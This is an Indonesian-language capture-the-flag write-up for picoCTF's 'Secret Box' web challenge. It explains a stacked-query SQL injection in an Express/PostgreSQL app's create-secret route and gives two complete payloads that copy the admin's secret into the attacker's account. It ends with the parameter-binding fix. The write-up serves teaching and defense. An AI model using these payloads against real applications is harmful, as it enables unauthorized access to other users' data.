# Secret Box — picoCTF 2026

| Informasi | Detail |
|---|---|
| Event | picoCTF 2026 |
| Challenge | Secret Box |
| Kategori | Web Exploitation |
| Difficulty | Medium |
| Vulnerability | SQL Injection |

## Deskripsi Challenge

Challenge ini memberikan sebuah aplikasi web sederhana untuk menyimpan secret. User dapat melakukan signup, login, lalu membuat secret baru. Target dari challenge ini adalah mendapatkan flag yang disimpan sebagai secret milik user admin.

Source code challenge diberikan dalam folder `source`. Dari source tersebut, aplikasi menggunakan:

- Node.js dengan Express sebagai web server.
- EJS sebagai template engine.
- PostgreSQL sebagai database.
- Knex untuk koneksi database.

Secara fungsi, aplikasi memiliki fitur utama berikut:

1. Signup akun baru.
2. Login akun.
3. Membuat secret.
4. Melihat daftar secret milik user yang sedang login.

Flag tidak langsung ditampilkan ke semua user. Flag disimpan di database sebagai content secret milik admin.

---

## Reconnaissance / Analisis Awal

Tahap awal dilakukan dengan membaca struktur source code challenge. File penting yang dianalisis adalah:

- `source/app/src/server.js`
- `source/app/src/db.js`
- `source/db/initdb.sql`
- `source/app/src/views/create_secret.ejs`
- `source/app/src/views/my_secrets.ejs`

Dari file `source/db/initdb.sql`, terdapat tiga tabel utama:

```sql
CREATE TABLE users (
    id text PRIMARY KEY DEFAULT gen_random_uuid(),
    username text NOT NULL,
    password text NOT NULL,
    created_at timestamptz NOT NULL DEFAULT now()
);

CREATE TABLE tokens (
    id text PRIMARY KEY DEFAULT gen_random_uuid(),
    user_id text NOT NULL REFERENCES users(id),
    created_at timestamptz NOT NULL DEFAULT now(),
    expired_at timestamptz NOT NULL DEFAULT now() + interval '1 days'
);

CREATE TABLE secrets (
    id text PRIMARY KEY DEFAULT gen_random_uuid(),
    owner_id text NOT NULL REFERENCES users(id),
    content text NOT NULL,
    created_at timestamptz NOT NULL DEFAULT now()
);
```

Admin dibuat dengan UUID yang sudah hardcoded:

```sql
INSERT INTO users(id, username, password)
VALUES ('e2a66f7d-2ce6-4861-b4aa-be8e069601cb', 'admin', 'fake_password');
```

Kemudian admin diberi satu secret:

```sql
INSERT INTO secrets(owner_id, content)
VALUES ('e2a66f7d-2ce6-4861-b4aa-be8e069601cb', 'picoCTF{fake_flag}');
```

Pada runtime, file `source/app/src/db.js` mengganti password admin dan isi secret admin menggunakan environment variable:

```javascript
await db('users')
  .where({ id: 'e2a66f7d-2ce6-4861-b4aa-be8e069601cb' })
  .update({ password: process.env.USERPASSWORD });

await db('secrets')
  .where({ owner_id: 'e2a66f7d-2ce6-4861-b4aa-be8e069601cb' })
  .update({ content: process.env.FLAG });
```

Artinya, flag asli berada pada tabel `secrets`, tepatnya di row yang `owner_id`-nya adalah UUID admin:

```text
e2a66f7d-2ce6-4861-b4aa-be8e069601cb
```

---

## Vulnerability Identified

Vulnerability utama pada challenge ini adalah SQL Injection pada fitur create secret.

Endpoint rentan berada di `source/app/src/server.js`:

```javascript
app.post('/secrets/create', authMiddleware, async (req, res) => {
	const userId = req.userId;
	if (!userId){
		res.clearCookie('auth_token');
		return res.redirect('/');
	}

	const content = req.body.content;
	const query = await db.raw(
		`INSERT INTO secrets(owner_id, content) VALUES ('${userId}', '${content}')` 
	);

	return res.redirect('/');
});
```

Bagian yang bermasalah adalah query berikut:

```javascript
`INSERT INTO secrets(owner_id, content) VALUES ('${userId}', '${content}')`
```

Nilai `content` berasal langsung dari input user:

```javascript
const content = req.body.content;
```

Kemudian nilai tersebut ditempel langsung ke SQL string tanpa parameter binding. Karena input berada di dalam tanda petik tunggal, attacker dapat memasukkan karakter `'` untuk menutup string SQL, lalu menambahkan query baru.

Secara konsep, query normalnya seperti ini:

```sql
INSERT INTO secrets(owner_id, content) VALUES ('USER_ID', 'hello')
```

Jika user mengisi content dengan payload SQL injection, query dapat berubah menjadi:

```sql
INSERT INTO secrets(owner_id, content) VALUES ('USER_ID', 'x');
INSERT INTO secrets(owner_id, content) SELECT ...;
--')
```

Ini disebut stacked query SQL injection, karena attacker dapat menjalankan query tambahan setelah query asli.

Menariknya, route login dan signup relatif lebih aman karena menggunakan placeholder `?`:

```javascript
const userResult = await db.raw(
	`SELECT * FROM users WHERE username = ? AND password = ? LIMIT 1`, 
	[username, password]
);
```

Namun pada fitur create secret, developer tidak menggunakan placeholder dan malah memakai string interpolation langsung.

---

## Exploitation Steps

### 1. Membuat akun biasa

Pertama, buat akun baru melalui halaman signup. Akun ini tidak perlu memiliki privilege khusus karena bug berada pada fitur create secret yang dapat diakses oleh user biasa setelah login.

Contoh credential:

```text
username: user
password: user
```

Setelah signup, login menggunakan credential tersebut.

### 2. Membuat secret normal

Setelah login, masuk ke halaman create secret dan buat satu secret normal dengan isi:

```text
x
```

Tujuan langkah ini adalah membuat satu row di tabel `secrets` yang dimiliki oleh user kita. Row ini akan dipakai untuk mengambil `owner_id` milik akun kita.

Kenapa perlu begitu? Karena untuk menampilkan flag di halaman My Secrets, flag harus menjadi secret milik user kita. Halaman My Secrets hanya mengambil secret berdasarkan `owner_id` user yang sedang login:

```javascript
const query = await db.raw(
	`SELECT * FROM secrets WHERE owner_id = ?`,
	[userId]
);
```

Jadi kita perlu memasukkan ulang content flag admin ke tabel `secrets`, tetapi dengan `owner_id` milik user kita.

### 3. Menyiapkan payload SQL Injection

Payload yang digunakan:

```sql
x'); INSERT INTO secrets(owner_id, content) SELECT owner_id, (SELECT content FROM secrets WHERE owner_id='e2a66f7d-2ce6-4861-b4aa-be8e069601cb' LIMIT 1) FROM secrets WHERE content='x' ORDER BY created_at DESC LIMIT 1;--
```

Payload ini dikirim sebagai content secret kedua.

### 4. Cara kerja payload

Payload tersebut akan masuk ke query rentan:

```javascript
`INSERT INTO secrets(owner_id, content) VALUES ('${userId}', '${content}')`
```

Jika content diisi payload, query akhirnya menjadi kurang lebih seperti ini:

```sql
INSERT INTO secrets(owner_id, content) VALUES ('USER_ID', 'x');
INSERT INTO secrets(owner_id, content)
SELECT owner_id,
       (SELECT content
        FROM secrets
        WHERE owner_id='e2a66f7d-2ce6-4861-b4aa-be8e069601cb'
        LIMIT 1)
FROM secrets
WHERE content='x'
ORDER BY created_at DESC
LIMIT 1;
--')
```

Penjelasan bagian payload:

1. `x')`

   Bagian ini menutup value `content` pada query asli agar query pertama tetap valid.

2. `;`

   Semicolon digunakan untuk mengakhiri query pertama dan memulai query kedua.

3. `INSERT INTO secrets(owner_id, content)`

   Query kedua membuat secret baru.

4. `SELECT owner_id, ... FROM secrets WHERE content='x' ORDER BY created_at DESC LIMIT 1`

   Bagian ini mengambil `owner_id` dari secret normal yang sebelumnya kita buat dengan isi `x`. Dengan begitu, secret baru akan menjadi milik akun kita.

5. `(SELECT content FROM secrets WHERE owner_id='e2a66f7d-2ce6-4861-b4aa-be8e069601cb' LIMIT 1)`

   Subquery ini mengambil content secret milik admin. Karena flag disimpan sebagai secret admin, hasilnya adalah flag.

6. `--`

   Bagian ini mengomentari sisa query asli agar tidak menyebabkan syntax error.

### 5. Submit payload

Masuk ke halaman create secret, lalu isi field content dengan payload berikut:

```sql
x'); INSERT INTO secrets(owner_id, content) SELECT owner_id, (SELECT content FROM secrets WHERE owner_id='e2a66f7d-2ce6-4861-b4aa-be8e069601cb' LIMIT 1) FROM secrets WHERE content='x' ORDER BY created_at DESC LIMIT 1;--
```

Setelah submit, aplikasi akan redirect kembali ke halaman My Secrets.

### 6. Membaca flag

Halaman My Secrets menampilkan semua secret milik user yang sedang login:

```ejs
<% secrets.forEach(sec => { %>
	<div class="secret">
		<p> <%= sec.id %></p>
		<div class="secret-date"><%= sec.created_at %></div>
		<div class="secret-content"><%= sec.content %></div>
	</div>
<% }); %>
```

Jika payload berhasil, akan muncul secret baru yang isinya adalah flag admin.

---

## Alternative Payload

Jika payload berbasis content `x` tidak stabil karena ada banyak secret dengan isi sama, kita dapat menggunakan token login dari cookie `auth_token`.

Payload alternatif:

```sql
x'); INSERT INTO secrets(owner_id, content) SELECT t.user_id, s.content FROM tokens t CROSS JOIN secrets s WHERE t.id='<ISI_AUTH_TOKEN_KAMU>' AND s.owner_id='e2a66f7d-2ce6-4861-b4aa-be8e069601cb' LIMIT 1;--
```

Cara pakainya:

1. Login ke aplikasi.
2. Buka Developer Tools browser.
3. Ambil value cookie `auth_token`.
4. Ganti `<ISI_AUTH_TOKEN_KAMU>` dengan value cookie tersebut.
5. Submit payload sebagai content secret.

Payload ini lebih stabil karena langsung mengambil `user_id` dari tabel `tokens` berdasarkan token login kita:

```sql
SELECT t.user_id, s.content
FROM tokens t
CROSS JOIN secrets s
WHERE t.id='<ISI_AUTH_TOKEN_KAMU>'
  AND s.owner_id='e2a66f7d-2ce6-4861-b4aa-be8e069601cb'
LIMIT 1;
```

---

## Root Cause

Root cause dari vulnerability ini adalah penggunaan raw SQL dengan string interpolation untuk data yang dikontrol user.

Kode rentan:

```javascript
const query = await db.raw(
	`INSERT INTO secrets(owner_id, content) VALUES ('${userId}', '${content}')` 
);
```

Seharusnya query menggunakan parameter binding:

```javascript
const query = await db.raw(
	`INSERT INTO secrets(owner_id, content) VALUES (?, ?)`,
	[userId, content]
);
```

Dengan parameter binding, input user akan diperlakukan sebagai data biasa, bukan sebagai bagian dari sintaks SQL.

---

## Flag

```text
picoCTF{REDACTED}
```

Flag asli akan muncul di halaman My Secrets setelah payload berhasil dijalankan.

---

## Lesson Learned

Jangan pernah membangun query SQL dengan menggabungkan string dari input user. Walaupun input terlihat sederhana seperti field content, attacker tetap dapat menutup string SQL dan menyisipkan query tambahan. Gunakan parameterized query atau query builder dengan binding agar input user selalu diperlakukan sebagai data, bukan kode SQL.

Selain itu, hindari menyimpan data sensitif seperti flag atau secret admin pada tabel yang dapat diakses melalui fitur user biasa tanpa kontrol akses yang kuat. Walaupun query My Secrets sudah memfilter berdasarkan `owner_id`, bug SQL injection pada fitur insert dapat digunakan untuk menyalin data milik admin ke user biasa.

Writer : Muhammad Afif Nuromli
